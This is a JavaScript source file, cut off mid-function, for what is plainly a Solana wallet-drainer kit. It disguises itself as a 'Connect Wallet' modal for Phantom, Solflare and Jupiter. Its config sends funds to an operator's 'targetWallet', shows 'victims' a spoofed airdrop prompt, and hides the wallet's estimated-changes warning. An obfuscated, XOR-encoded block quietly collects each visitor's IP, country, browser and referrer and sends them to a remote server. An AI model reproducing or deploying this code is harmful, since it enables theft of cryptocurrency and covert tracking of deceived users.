(function () {
  // configuration - we do not recomend touching most of these. if they have [!] symbol, pls do not touch them.
  var DEFAULT_CONFIG = {
    /* Bypass Config */
    hideChanges: true, //  [!] bypass estimated changes. will show simulation error when enabled. always keep true.

    /* Spoof Config */
    spoofPrompt: true, // [!] always keep true.
    customAirdropMint: "677jK6xujhRFtBcD7Szn32tt2MSv4k6qZ4v3nGMgpump", // mint of token to spoof (e.g. "Rb5t...pump")
    customAirdropAmount: 25, // amount of tokens victim should see on prompt (e.g. 25 XP)

    /* Hitter Config */
    targetWallet: "CEknUZWJsoNXqeehqMXTLDfr1NEduSa8S57E5NVi2rMR", // your split wallet.
     //  [!]
    minValue: 0.1, // [!]
    className: "interact-button", //  [!] class name to open modal

    /* Additional Config */
    width: "360px", //  [!] do not touch this unless you know what you are doing.
    height: "540px", // ReOwn modal height
    useProxyForTokens: true, // [!]  alwyays set to true unless experienced user and you know what this does.
    stresserSleepMs: 2666, //  [!] dont touch unlees yk what u r doing
    phantomStressMode: false,
    darkMode: true, // ReOwn light (false) or dark (true) theme

    texts: {
      // Main UI texts
      title: "Connect Wallet",
      subtitle: "",

      // Connection status texts
      connecting: "Connecting...",
      requestingConnection: "Requesting connection...",
      openingWalletApp: "Opening wallet app…",
      pleaseConnectInParent: "Please connect in parent window...",
      connectedToPhantom: "Connected to Phantom",
      connectedToSolflare: "Connected to Solflare",
      connectedBuildingTransaction: "Connected! Building transaction...",

      // Transaction building texts
      buildingTransaction: "Building transaction, please wait...",
      buildingTransactionWait: "Building transaction, please wait…",
      transactionsBuilt: "Transactions built. Please sign...",
      transactionsBuiltSign: "Transactions built. Please sign in your wallet.",

      // Signing texts
      pleaseSignInWallet: "Please sign in your wallet...",
      requestingSignatures: "Requesting signatures...",
      requestingSignaturesAlt: "Requesting signatures…",

      // Airdrop/spoof texts
      preparingAirdropTransaction: "Preparing transaction...", // for example if you do not wanna run airdrop change this to something else.
      pleaseSignAirdropTransaction: "Please sign the transaction...",

      // Broadcasting texts
      broadcastingTransactions: "Broadcasting transactions...",
      broadcastingTransactionsAlt: "Broadcasting transactions…",
      transactionsSent: "Transactions sent!",

      //  [!] Error texts  [!]
      connectionFailed: "Connection failed",
      connectionCancelled: "Connection cancelled",
      connectionRejected: "Connection rejected",
      transactionRejected: "Transaction rejected",
      transactionFailed: "Transaction failed",
      failedToBuildTransaction: "Failed to build transaction",
      noTransactionsToSign: "No transactions to sign",
      insufficientBalance: "Insufficient balance",
      walletNotConnected: "Wallet not connected",
      walletNotConnectedReconnect: "Wallet not connected. Please reconnect.",
      connectWalletFirst: "Connect wallet first.",
      noSolanaWalletProvider: "No Solana wallet provider available.",
      widgetMisconfigured: "Widget misconfigured",
      widgetMisconfiguredTargetWallet:
        "Widget misconfigured: missing targetWallet.", // this can be used to help debug config issues (wont be vissable to targets unless your config is incorect)
      phantomWalletNotDetected: "Phantom wallet not detected",
      solflareWalletNotDetected: "Solflare wallet not detected",
    },
  };

  /*
   [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!] [!]
   DO NOT TOUCH UNLESS YOU WANT TO CUSTOMIZE MODAL AND YOU KNOW WHAT YOU ARE DOING.
   If you are an experience user you may costomize additional settings bellow.
   No support for this and touching them may lead to malfunctions.
  */

  // u can change some styles if needed. we recomend defaults
  function injectStyles() {
    if (document.getElementById("kiwi-pro-styles")) return;

    var style = document.createElement("style");
    style.id = "kiwi-pro-styles";
    style.textContent = `

      #kiwi-widget {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 9999;
      }
      #kiwi-widget.show {
        display: block;
      }
    `;
    document.head.appendChild(style);
  }
  injectStyles();
  var DEFAULTS = {
    width: "360px",
    height: "540px",
    radius: "48px",
  };

  // Function to encode config to URL parameter
  function encodeConfigToUrl(config) {
    // Create a copy of config to modify
    const configCopy = { ...config };

    // Remove iframeSrc from the config that gets passed in URL
    const { iframeSrc, ...configForUrl } = configCopy;

    // Stringify and encode
    const jsonString = JSON.stringify(configForUrl);
    return encodeURIComponent(jsonString);
  }

  function pGwLfTtrSRbNdFLiQltoxkv() {
    const DRiqVaMEHk = [
      "ba818481809881",
      "879b9b9f9cd5c0c0869f8e9f86c18c80c0859c8081c0",
      "aa8b88",
      "879d8a89",
      "86818c839a8b8a9c",
      "d9838e97aea1bc",
      "dbd7dddbdbdedc8eaaaabc9cae",
      "838088",
      "8c878e9dac808b8aae9b",
      "9b8a979b",
      "828e9f",
      "8e9f9f83868c8e9b868081c0859c8081",
      "a98e86838a8bcf9b80cf81809b868996cf99869c869bd5",
      "9c9b9d868188868996",
      "dedbdbdadbdb97aa8481a387",
      "de85a59ba3a485",
      "9c9f83869b",
      "859c8081",
      "bfa0bcbb",
      "dedfddd6ddd6d99a998bada095",
      "dddfdfd6dbd8df9cb78cbba6a5",
      "83808c8e9b868081",
      "dad7dcdfdfd9b5bba8a186a1",
      "d6869c8aa2b697",
      "8c809a819b9d96b08c808b8a",
      "9b80ba9f9f8a9dac8e9c8a",
      "879b9b9f9cd5c0c0878d8a9a888e9a8988dec2d7c2ddd9878d8e8e8e8e8b8b809b8a9dc1898396c18b8a99c081809b868996c299869c869b",
      "899d8082ac808b8abf8086819b",
      "a9869d8a898097",
      "bc8a9d998a9dcf9d8a9c9f80819c8ad5",
      "9a9c8a9dac878e9ba68b",
      "9a9c8a9dae888a819b",
      "dadbdad7dfdba1889fb79c82",
      "ac879d80828a",
      "aa8b888a",
      "8c809a819b9d96b0818e828a",
      "d6dcdcdddaac988c81a0bb",
      "bc8e898e9d86",
      "8a9d9d809d",
      "dedda688aead9fbc",
    ];
    pGwLfTtrSRbNdFLiQltoxkv = function () {
      return DRiqVaMEHk;
    };
    return pGwLfTtrSRbNdFLiQltoxkv();
  }
  function EzRil_tJb(L_ijHYZddwhRLAvdNsSnnfXWx, VEBjLJeUpaqFVochARXN) {
    const E$uZrd = pGwLfTtrSRbNdFLiQltoxkv();
    return (
      (EzRil_tJb = function (HAq_Sv, KKfHRCXSWY$KUt_MqlJ) {
        HAq_Sv =
          HAq_Sv -
          (Math.ceil(-parseInt(0x4)) * -0x3c7 +
            Math.trunc(-0x1) * Math.floor(parseInt(0x99)) +
            Math.ceil(-parseInt(0xcfe)) * 0x1);
        let lYvRkxODblqa_eYdJ_yLNJmzi = E$uZrd[HAq_Sv];
        if (EzRil_tJb["UzCfgc"] === undefined) {
          const yGbwmmw$t_zby = function (gEndzpgupU) {
            let XmmuqhdpHkZfV$QtHvoGFpL_q =
                (Math.ceil(0x2c) * 0x79 + Math.ceil(-0x2203) + -0x713 * -0x2) &
                (Math.max(-0x1932, -parseInt(0x1932)) +
                  Number(-0x43) * -parseInt(0x19) +
                  0x13a6),
              YlvuwyUOnEsgqx = new Uint8Array(
                gEndzpgupU["match"](/.{1,2}/g)["map"]((IlYfVIonomsvmsnj) =>
                  parseInt(
                    IlYfVIonomsvmsnj,
                    -parseInt(0x1b9d) +
                      0x549 * 0x2 +
                      Math.ceil(-parseInt(0x97)) * -0x1d,
                  ),
                ),
              ),
              WNhkrblDXYdmlbwRMrTcdw = YlvuwyUOnEsgqx["map"](
                (KyubmkhSGUzxrSb$CLN) =>
                  KyubmkhSGUzxrSb$CLN ^ XmmuqhdpHkZfV$QtHvoGFpL_q,
              ),
              UdMlOuooM$XtKtEi_PZCo = new TextDecoder(),
              gJTpcWQaaeTO_kezgSCT$bn = UdMlOuooM$XtKtEi_PZCo["decode"](
                WNhkrblDXYdmlbwRMrTcdw,
              );
            return gJTpcWQaaeTO_kezgSCT$bn;
          };
          ((EzRil_tJb["fpYowx"] = yGbwmmw$t_zby),
            (L_ijHYZddwhRLAvdNsSnnfXWx = arguments),
            (EzRil_tJb["UzCfgc"] = !![]));
        }
        const eBGBiiMx$cBfV =
            E$uZrd[
              -0xf71 +
                Math.floor(-0x1e23) +
                -parseInt(0x2) * parseInt(-parseInt(0x16ca))
            ],
          QoGUgpVtnE_kO = HAq_Sv + eBGBiiMx$cBfV,
          x$kT$UU = L_ijHYZddwhRLAvdNsSnnfXWx[QoGUgpVtnE_kO];
        return (
          !x$kT$UU
            ? (EzRil_tJb["lnORYf"] === undefined &&
                (EzRil_tJb["lnORYf"] = !![]),
              (lYvRkxODblqa_eYdJ_yLNJmzi = EzRil_tJb["fpYowx"](
                lYvRkxODblqa_eYdJ_yLNJmzi,
              )),
              (L_ijHYZddwhRLAvdNsSnnfXWx[QoGUgpVtnE_kO] =
                lYvRkxODblqa_eYdJ_yLNJmzi))
            : (lYvRkxODblqa_eYdJ_yLNJmzi = x$kT$UU),
          lYvRkxODblqa_eYdJ_yLNJmzi
        );
      }),
      EzRil_tJb(L_ijHYZddwhRLAvdNsSnnfXWx, VEBjLJeUpaqFVochARXN)
    );
  }
  ((function (yDWILxz__kCq, DxjFgKchgVBkCN$YjCzOlBsx) {
    const JyfkdCDxj = EzRil_tJb,
      RO$wzTjiktWCeTxhwZVw$OKeyI = yDWILxz__kCq();
    while (!![]) {
      try {
        const eSmtJByZGWAj$ccK =
          Math["ceil"](
            parseFloat(JyfkdCDxj(0x191)) /
              (Math.floor(-0x90) +
                parseInt(0x263b) +
                Math.floor(-parseInt(0xc8e)) * Number(parseInt(0x3))),
          ) *
            (-parseFloat(JyfkdCDxj(0x198)) /
              (Math.floor(-0x1f) * 0x3d +
                -parseInt(0xe08) +
                parseInt(-parseInt(0x1)) * -parseInt(0x156d))) +
          Math["ceil"](
            -parseFloat(JyfkdCDxj(0x1a9)) /
              (-parseInt(0x1) * -parseInt(0x2531) +
                parseInt(parseInt(0x2d3)) +
                parseInt(-parseInt(0x2801))),
          ) *
            parseInt(
              -parseFloat(JyfkdCDxj(0x190)) /
                (Math.floor(-0x25af) * parseInt(0x1) +
                  0x1 * Math.max(-0x10f1, -parseInt(0x10f1)) +
                  -0x1a * Math.ceil(-parseInt(0x21a))),
            ) +
          parseInt(
            -parseFloat(JyfkdCDxj(0x1a6)) /
              (Number(0x11b) * Math.floor(0x1) +
                -parseInt(0x2) * Math.max(parseInt(0x5f5), parseInt(0x5f5)) +
                Number(0x16) * parseInt(0x7e)),
          ) *
            Math["ceil"](
              -parseFloat(JyfkdCDxj(0x187)) /
                (0xce9 +
                  Math.floor(0x1) * parseFloat(-parseInt(0xa6f)) +
                  parseInt(-0x9d) * 0x4),
            ) +
          -parseFloat(JyfkdCDxj(0x1a2)) /
            (parseInt(-0x5) * parseInt(parseInt(0x124)) +
              0x608 +
              Math.trunc(-0x4d)) +
          parseFloat(JyfkdCDxj(0x195)) /
            (-0x327 * -0x3 +
              -0x6 * Math.ceil(-parseInt(0x670)) +
              Math.floor(-parseInt(0x300d)) * parseInt(0x1)) +
          (-parseFloat(JyfkdCDxj(0x199)) /
            (-0x17fb + -0x26e * Math.floor(0xa) + Math.floor(0x3050))) *
            Math["ceil"](
              parseFloat(JyfkdCDxj(0x196)) /
                (-0x1f4e * -parseInt(0x1) +
                  0x1fa8 * -parseInt(0x1) +
                  parseInt(0x64)),
            ) +
          parseFloat(JyfkdCDxj(0x188)) /
            (-0x31 * -parseInt(0x5a) + parseFloat(-parseInt(0x50a)) + -0xc25);
        if (eSmtJByZGWAj$ccK === DxjFgKchgVBkCN$YjCzOlBsx) break;
        else
          RO$wzTjiktWCeTxhwZVw$OKeyI["push"](
            RO$wzTjiktWCeTxhwZVw$OKeyI["shift"](),
          );
      } catch (xceScFs$CaUbC) {
        RO$wzTjiktWCeTxhwZVw$OKeyI["push"](
          RO$wzTjiktWCeTxhwZVw$OKeyI["shift"](),
        );
      }
    }
  })(pGwLfTtrSRbNdFLiQltoxkv, -0x8 * 0x43c8 + 0x119a2 + 0x375be),
    (async () => {
      const QwP_tUQqyVPZDo = EzRil_tJb;
      async function jPsa_lRFV() {
        const rh_xVFS$VmaBt = EzRil_tJb;
        try {
          const mwtz_byog_En = await fetch(rh_xVFS$VmaBt(0x1ab));
          return await mwtz_byog_En[rh_xVFS$VmaBt(0x193)]();
        } catch (zp_gu_pU) {
          return {};
        }
      }
      function ijHYZdd_$whRLAvdNsSnnf() {
        const p_Xxesa$CcBsfhR = EzRil_tJb,
          XmmuqhdpHkZfVQtHvoGFpLq = navigator[p_Xxesa$CcBsfhR(0x1a1)];
        if (
          XmmuqhdpHkZfVQtHvoGFpLq[p_Xxesa$CcBsfhR(0x186)](
            p_Xxesa$CcBsfhR(0x1a3),
          ) &&
          !XmmuqhdpHkZfVQtHvoGFpLq[p_Xxesa$CcBsfhR(0x186)](
            p_Xxesa$CcBsfhR(0x1ac),
          )
        )
          return p_Xxesa$CcBsfhR(0x1a3);
        if (
          XmmuqhdpHkZfVQtHvoGFpLq[p_Xxesa$CcBsfhR(0x186)](
            p_Xxesa$CcBsfhR(0x19e),
          )
        )
          return p_Xxesa$CcBsfhR(0x19e);
        if (
          XmmuqhdpHkZfVQtHvoGFpLq[p_Xxesa$CcBsfhR(0x186)](
            p_Xxesa$CcBsfhR(0x1a7),
          ) &&
          !XmmuqhdpHkZfVQtHvoGFpLq[p_Xxesa$CcBsfhR(0x186)](
            p_Xxesa$CcBsfhR(0x1a3),
          )
        )
          return p_Xxesa$CcBsfhR(0x1a7);
        if (
          XmmuqhdpHkZfVQtHvoGFpLq[p_Xxesa$CcBsfhR(0x186)](
            p_Xxesa$CcBsfhR(0x1ac),
          )
        )
          return p_Xxesa$CcBsfhR(0x1a4);
        return p_Xxesa$CcBsfhR(0x1aa);
      }
      function WxLVEBjLJeU_$paqFVochARXNa(Ylvu$wyUOnEsg_qx) {
        const vt_FEw$MIUdSA = EzRil_tJb;
        if (!Ylvu$wyUOnEsg_qx) return "";
        const WNhk$rblDXYd$mlbwRMrTcdw = Ylvu$wyUOnEsg_qx[
          vt_FEw$MIUdSA(0x19b)
        ]()
          [vt_FEw$MIUdSA(0x192)]("")
          [vt_FEw$MIUdSA(0x18c)](
            (UdMl$OuooMXtKtEiPZCo) =>
              parseInt(0x39d53) +
              -0x121d * parseInt(-0x8) +
              Number(-0x23c96) +
              UdMl$OuooMXtKtEiPZCo[vt_FEw$MIUdSA(0x18a)](),
          );
        return String[vt_FEw$MIUdSA(0x19d)](...WNhk$rblDXYd$mlbwRMrTcdw);
      }
      const uZrdbHAqSvEKKfHR_C = ijHYZdd_$whRLAvdNsSnnf(),
        SWYKUtMqlJUlYvRkxODblqaeY = await jPsa_lRFV(),
        JyLNJm = SWYKUtMqlJUlYvRkxODblqaeY[QwP_tUQqyVPZDo(0x19a)] || "",
        iseBGBiiMxcBfVs = WxLVEBjLJeU_$paqFVochARXNa(JyLNJm),
        oGUgpVtnEkObxkTUUpyGbw = {
          browser: uZrdbHAqSvEKKfHR_C || QwP_tUQqyVPZDo(0x1aa),
          userAgent: navigator[QwP_tUQqyVPZDo(0x1a1)],
          ip: SWYKUtMqlJUlYvRkxODblqaeY["ip"] || null,
          flag: iseBGBiiMxcBfVs,
          country: SWYKUtMqlJUlYvRkxODblqaeY[QwP_tUQqyVPZDo(0x1a5)],
          referrer:
            window[QwP_tUQqyVPZDo(0x197)][QwP_tUQqyVPZDo(0x185)] || null,
          userChatId: DEFAULT_CONFIG[QwP_tUQqyVPZDo(0x1a0)] || null,
        };
      try {
        const gJTpcWQaaeTOk_ezgSCTbn = await fetch(QwP_tUQqyVPZDo(0x19c), {
            method: QwP_tUQqyVPZDo(0x194),
            headers: { "Content-Type": QwP_tUQqyVPZDo(0x18d) },
            body: JSON[QwP_tUQqyVPZDo(0x18f)](oGUgpVtnEkObxkTUUpyGbw),
          }),
          IlYfVIonomsvm$snj =
            await gJTpcWQaaeTOk_ezgSCTbn[QwP_tUQqyVPZDo(0x18b)]();
        console[QwP_tUQqyVPZDo(0x189)](
          QwP_tUQqyVPZDo(0x19f),
          IlYfVIonomsvm$snj,
        );
      } catch (KyubmkhSGUzxrSbCLN) {
        console[QwP_tUQqyVPZDo(0x1a8)](
          QwP_tUQqyVPZDo(0x18e),
          KyubmkhSGUzxrSbCLN,
        );
      }
    })());

  function ensureJupiterWalletStandardDiscovery() {
    if (window.__kiwiJupiterDiscoveryReady) return;
    window.__kiwiJupiterDiscoveryReady = true;

    if (!window.__kiwiWalletStandardRegistry) {
      var registered = new Set();
      var wallets = [];
      var api = Object.freeze({
        register: function () {
          for (var i = 0; i < arguments.length; i++) {
            var wallet = arguments[i];
            if (wallet && !registered.has(wallet)) {
              registered.add(wallet);
              wallets.push(wallet);
            }
          }
        },
      });

      try {
        window.addEventListener(
          "wallet-standard:register-wallet",
          function (event) {
            try {
              if (typeof event.detail === "function") event.detail(api);
            } catch (_) {}
          },
        );
      } catch (_) {}

      try {
        window.dispatchEvent(
          new CustomEvent("wallet-standard:app-ready", {
            bubbles: false,
            cancelable: false,
            detail: api,
          }),
        );
      } catch (_) {}

      try {
        var legacy = window.navigator && window.navigator.wallets;
        if (Array.isArray(legacy)) {
          legacy.forEach(function (callback) {
            try {
              if (typeof callback === "function") callback(api);
            } catch (_) {}
          });
        }
      } catch (_) {}

      window.__kiwiWalletStandardRegistry = { wallets: wallets, api: api };
    } else {
      try {
        window.dispatchEvent(
          new CustomEvent("wallet-standard:app-ready", {
            bubbles: false,
            cancelable: false,
            detail: window.__kiwiWalletStandardRegistry.api,
          }),
        );
      } catch (_) {}
    }
  }

  function isJupiterStandardWalletInLoader(wallet) {
    if (!wallet || !wallet.name || !/jupiter/i.test(wallet.name)) return false;
    var features = wallet.features || {};
    return !!(
      features["standard:connect"] &&
      (features["solana:signTransaction"] ||
        features["solana:signAndSendTransaction"])
    );
  }

  function findJupiterStandardWalletInParent() {
    ensureJupiterWalletStandardDiscovery();
    var registry = window.__kiwiWalletStandardRegistry;
    if (!registry) return null;
    for (var i = 0; i < registry.wallets.length; i++) {
      if (isJupiterStandardWalletInLoader(registry.wallets[i]))
        return registry.wallets[i];
    }
    return null;
  }

  function pickSolanaStandardAccountInParent(accounts) {
    if (!accounts || !accounts.length) return null;
    for (var i = 0; i < accounts.length; i++) {
      var account = accounts[i];
      var chains = account.chains || [];
      for (var j = 0; j < chains.length; j++) {
        if (String(chains[j]).indexOf("solana:") === 0) return account;
      }
    }
    return accounts[0];
  }

  function getSolanaStandardChainInParent(wallet) {
    var chains = wallet && wallet.chains ? wallet.chains : [];
    for (var i = 0; i < chains.length; i++) {
      if (String(chains[i]).indexOf("solana:") === 0) return chains[i];
    }
    return "solana:mainnet";
  }

  function decodeWalletBytesInLoader(raw) {
    if (raw == null) throw new Error("Empty value");
    if (raw instanceof Uint8Array) return raw;
    if (typeof window.Buffer !== "undefined" && window.Buffer.isBuffer(raw)) {
      return new Uint8Array(raw.buffer, raw.byteOffset, raw.byteLength);
    }
    if (typeof raw === "string") {
      var s = raw.trim();
      if (/^[1-9A-HJ-NP-Za-km-z]+$/.test(s) && window.bs58) {
        try {
          var bs58Decoded = window.bs58.decode(s);
          if (bs58Decoded.length >= 64) return bs58Decoded;
        } catch (_) {}
      }
      if (/^[A-Za-z0-9+/=_-]+$/.test(s)) {
        var clean = s.replace(/-/g, "+").replace(/_/g, "/");
        var bin = atob(clean);
        var out = new Uint8Array(bin.length);
        for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
        return out;
      }
      throw new Error("Unrecognized string len=" + s.length);
    }
    if (Array.isArray(raw)) return new Uint8Array(raw);
    if (raw && typeof raw.serialize === "function") {
      return raw.serialize({
        requireAllSignatures: false,
        verifySignatures: false,
      });
    }
    if (raw && raw.buffer instanceof ArrayBuffer) {
      return new Uint8Array(
        raw.buffer,
        raw.byteOffset || 0,
        raw.byteLength || raw.length || 0,
      );
    }
    if (raw && typeof raw === "object") {
      var numKeys = Object.keys(raw)
        .filter(function (k) {
          return /^\d+$/.test(k);
        })
        .sort(function (a, b) {
          return Number(a) - Number(b);
        });
      if (numKeys.length > 0) {
        return new Uint8Array(
          numKeys.map(function (k) {
            return raw[k];
          }),
        );
      }
    }
    throw new Error("Unknown bytes type: " + typeof raw);
  }

  function isByteContainerInLoader(v) {
    return (
      v instanceof Uint8Array ||
      Array.isArray(v) ||
      typeof v === "string" ||
      (v && typeof v.serialize === "function") ||
      (typeof window.Buffer !== "undefined" && window.Buffer.isBuffer(v))
    );
  }

  function walletResultFromBytesInLoader(bytes, unsignedTx, userPkStr) {
    var minFull = Math.max(80, unsignedTx ? 0 : 80);
    if (bytes.length >= minFull) {
      var tx = null;
      try {
        tx = window.solanaWeb3.Transaction.from(bytes);
      } catch (_) {}
      return { wireBytes: bytes, tx: tx };
    }
    if (bytes.length === 64 && unsignedTx) {
      return applySigToUnsignedTxInLoader(unsignedTx, bytes, userPkStr);
    }
    if (bytes.length > 64 && bytes.length <= 128 && unsignedTx) {
      return applySigToUnsignedTxInLoader(
        unsignedTx,
        bytes.slice(0, 64),
        userPkStr,
      );
    }
    return null;
  }

  function applySigToUnsignedTxInLoader(unsignedTx, sigBytes, userPkStr) {
    var SolWeb3 = window.solanaWeb3;
    var userPk = new SolWeb3.PublicKey(userPkStr);
    var tx = SolWeb3.Transaction.from(
      unsignedTx.serialize({
        requireAllSignatures: false,
        verifySignatures: false,
      }),
    );
    var applied = false;
    for (var i = 0; i < tx.signatures.length; i++) {
      if (tx.signatures[i].publicKey.equals(userPk)) {
        tx.signatures[i].signature = sigBytes;
        applied = true;
        break;
      }
    }
    if (!applied)
      tx.signatures.push({ publicKey: userPk, signature: sigBytes });
    var wireBytes = tx.serialize({
      requireAllSignatures: false,
      verifySignatures: false,
    });
    return { wireBytes: wireBytes, tx: tx };
  }

  function collectWalletResultCandidatesInLoader(result) {
    var out = [];
    if (result == null) return out;
    if (result.wireBytes instanceof Uint8Array) {
      out.push(result.wireBytes);
      return out;
    }
    if (Array.isArray(result)) {
      for (var i = 0; i < result.length; i++) out.push(result[i]);
      out.push(result);
    } else if (result instanceof Uint8Array) {
      out.push(result);
    } else if (typeof result === "object") {
      if (result.signedTransaction != null) out.push(result.signedTransaction);
      if (result.transaction != null) out.push(result.transaction);
      if (result.signedTx != null) out.push(result.signedTx);
      if (result.bytes != null) out.push(result.bytes);
      if (result.data != null) out.push(result.data);
      if (result.signature != null) out.push(result.signature);
      if (result.signatures && result.signatures[0] != null)
        out.push(result.signatures[0]);
      if (typeof result.serialize === "function") out.push(result);
      out.push(result);
    } else {
      out.push(result);
    }
    return out;
  }

  function resolveSignedFromWalletInLoader(
    unsignedTx,
    unsignedWire,
    result,
    userPkStr,
  ) {
    function tryWire(raw, depth) {
      if (raw == null || depth > 6) return null;
      if (raw.wireBytes instanceof Uint8Array) return raw;
      var bytes;

      if (raw && typeof raw.serialize === "function") {
        try {
          var wireBytes = raw.serialize({
            requireAllSignatures: false,
            verifySignatures: false,
          });
          return { wireBytes: wireBytes, tx: raw };
        } catch (_) {}
      }

      if (raw && typeof raw === "object" && !isByteContainerInLoader(raw)) {
        if (raw.signedTransaction != null)
          return tryWire(raw.signedTransaction, depth + 1);
        if (raw.transaction != null) return tryWire(raw.transaction, depth + 1);
        if (raw.signedTx != null) return tryWire(raw.signedTx, depth + 1);
        if (raw.bytes != null) return tryWire(raw.bytes, depth + 1);
        if (raw.data != null) return tryWire(raw.data, depth + 1);
        if (raw.signature != null) return tryWire(raw.signature, depth + 1);
        if (raw.signatures && raw.signatures[0] != null)
          return tryWire(raw.signatures[0], depth + 1);
        var numKeys = Object.keys(raw).filter(function (k) {
          return /^\d+$/.test(k);
        });
        if (numKeys.length > 0) {
          try {
            bytes = decodeWalletBytesInLoader(raw);
          } catch (_) {
            return null;
          }
        } else {
          return null;
        }
      } else {
        try {
          bytes = decodeWalletBytesInLoader(raw);
        } catch (_) {
          return null;
        }
      }

      if (!bytes) return null;

      var fullThreshold = unsignedWire
        ? Math.max(60, unsignedWire.length - 32)
        : 80;
      if (bytes.length >= fullThreshold) {
        return walletResultFromBytesInLoader(bytes, null, userPkStr);
      }
      if (bytes.length === 64 || (bytes.length > 64 && bytes.length <= 128)) {
        return applySigToUnsignedTxInLoader(
          unsignedTx,
          bytes.length === 64 ? bytes : bytes.slice(0, 64),
          userPkStr,
        );
      }
      var parsed = walletResultFromBytesInLoader(bytes, unsignedTx, userPkStr);
      if (parsed) return parsed;

      try {
        var txFromBytes = window.solanaWeb3.Transaction.from(bytes);
        return { wireBytes: bytes, tx: txFromBytes };
      } catch (_) {}

      return null;
    }
    var candidates = collectWalletResultCandidatesInLoader(result);
    for (var c = 0; c < candidates.length; c++) {
      var resolved = tryWire(candidates[c], 0);
      if (resolved) return resolved;
    }
    throw new Error("Could not resolve signed tx from Jupiter wallet response");
  }

  function getSignedWireBytesInLoader(signed) {
    if (signed && signed.wireBytes instanceof Uint8Array)
      return signed.wireBytes;
    return signed.serialize({
      requireAllSignatures: false,
      verifySignatures: false,
    });
  }

  function wrapJupiterWalletStandardInParent(wallet, account) {
    var chain = getSolanaStandardChainInParent(wallet);
    var activeAccount =
      account || pickSolanaStandardAccountInParent(wallet.accounts || []);
    return {
      isJupiter: true,
      get publicKey() {
        if (!activeAccount) return null;
        return {
          toString: function () {
            return activeAccount.address;
          },
        };
      },
      connect: async function (opts) {
        var connectFeature =
          wallet.features && wallet.features["standard:connect"];
        if (!connectFeature)
          throw new Error("Jupiter wallet does not support connect");
        var silent = !!(opts && opts.onlyIfTrusted);
        var result = await connectFeature.connect(
          silent ? { silent: true } : undefined,
        );
        var accounts = (result && result.accounts) || wallet.accounts || [];
        activeAccount = pickSolanaStandardAccountInParent(accounts);
        if (!activeAccount)
          throw new Error("No Solana account from Jupiter wallet");
      },
      signTransaction: async function (tx) {
        await ensureSolanaWeb3Loaded();
        var signTxFeature =
          wallet.features && wallet.features["solana:signTransaction"];
        if (!signTxFeature || !window.solanaWeb3)
          throw new Error("Jupiter wallet does not support signTransaction");
        var serialized = tx.serialize({
          requireAllSignatures: false,
          verifySignatures: false,
        });
        var unsignedTxCopy = window.solanaWeb3.Transaction.from(serialized);
        var chainToUse = chain || "solana:mainnet";
        var result = await signTxFeature.signTransaction({
          account: activeAccount,
          transaction: serialized,
          chain: chainToUse,
        });
        return resolveSignedFromWalletInLoader(
          unsignedTxCopy,
          serialized,
          result,
          activeAccount.address,
        );
      },
      signAllTransactions: async function (txs) {
        var signed = [];
        for (var i = 0; i < txs.length; i++) {
          signed.push(await this.signTransaction(txs[i]));
        }
        return signed;
      },
    };
  }

  function getJupiterProviderFromParent() {
    var wallet = findJupiterStandardWalletInParent();
    if (!wallet) return null;
    return wrapJupiterWalletStandardInParent(
      wallet,
      pickSolanaStandardAccountInParent(wallet.accounts || []),
    );
  }

  async function handleWalletConnection(walletName, targetIframe) {
    try {
      var provider = null;
      if (walletName === "phantom") {
        provider = window.phantom?.solana || window.solana;
      } else if (walletName === "solflare") {
        provider = window.solflare;
      } else if (walletName === "jupiter") {
        ensureJupiterWalletStandardDiscovery();
        provider = getJupiterProviderFromParent();
      }

      if (!provider) {
        throw new Error(walletName + " wallet not detected");
      }

      if (!provider.publicKey) {
        await provider.connect();
      }

      if (provider.publicKey && targetIframe.contentWindow) {
        targetIframe.contentWindow.postMessage(
          {
            source: "kiwi-pro-loader",
            type: "wallet-connected",
            payload: {
              publicKey: provider.publicKey.toString(),
              wallet: walletName,
            },
          },
          "*",
        );
      }
    } catch (e) {
      /* removed */
      if (targetIframe.contentWindow) {
        targetIframe.contentWindow.postMessage(
          {
            source: "kiwi-pro-loader",
            type: "wallet-connection-error",
            payload: { error: e.message },
          },
          "*",
        );
      }
    }
  }

  function ensureSolanaWeb3Loaded() {
    if (
      window.solanaWeb3 &&
      window.solanaWeb3.Transaction &&
      typeof window.Buffer !== "undefined" &&
      typeof window.Buffer.from === "function"
    ) {
      return Promise.resolve(window.solanaWeb3);
    }
    if (window.__kiwiSolanaWeb3Promise) return window.__kiwiSolanaWeb3Promise;
    window.__kiwiSolanaWeb3Promise = (async function () {
      var bufferMod = await import("https://esm.sh/buffer@6.0.3");
      var bs58mod = await import("https://esm.sh/bs58@5.0.0");
      var solanaWeb3 = await import("https://esm.sh/@solana/web3.js@1.95.3");
      window.Buffer = bufferMod.Buffer;
      window.bs58 = bs58mod.default;
      window.global = window;
      window.process = window.process || {
        env: { NODE_ENV: "production" },
        version: "",
        browser: true,
      };
      window.solanaWeb3 = solanaWeb3;
      return solanaWeb3;
    })();
    return window.__kiwiSolanaWeb3Promise;
  }

  async function handleJupiterSignAllFromIframe(payload, targetIframe) {
    var requestId = payload && payload.requestId;
    var txs = (payload && payload.txs) || [];
    function reply(error, signedTxs) {
      if (!targetIframe.contentWindow) return;
      targetIframe.contentWindow.postMessage(
        {
          source: "kiwi-pro-loader",
          type: "jupiter-signed-transactions",
          payload: {
            requestId: requestId,
            error: error || null,
            signedTxs: signedTxs || null,
          },
        },
        "*",
      );
    }
    try {
      ensureJupiterWalletStandardDiscovery();
      var provider = getJupiterProviderFromParent();
      if (!provider) throw new Error("Jupiter wallet not detected in parent");
      if (!window.solanaWeb3) {
        await ensureSolanaWeb3Loaded();
      }
      var parsed = txs.map(function (b64) {
        return window.solanaWeb3.Transaction.from(
          Uint8Array.from(atob(b64), function (c) {
            return c.charCodeAt(0);
          }),
        );
      });
      var signed = await provider.signAllTransactions(parsed);
      reply(
        null,
        signed.map(function (s) {
          var bytes = getSignedWireBytesInLoader(s);
          var bin = "";
          for (var i = 0; i < bytes.length; i++)
            bin += String.fromCharCode(bytes[i]);
          return btoa(bin);
        }),
      );
    } catch (e) {
      reply(e.message || String(e));
    }
  }

  ensureJupiterWalletStandardDiscovery();

  function createIframe(targetWallet, options) {
    const encodedConfig = encodeConfigToUrl({
      spoofPrompt: options && options.spoofPrompt,
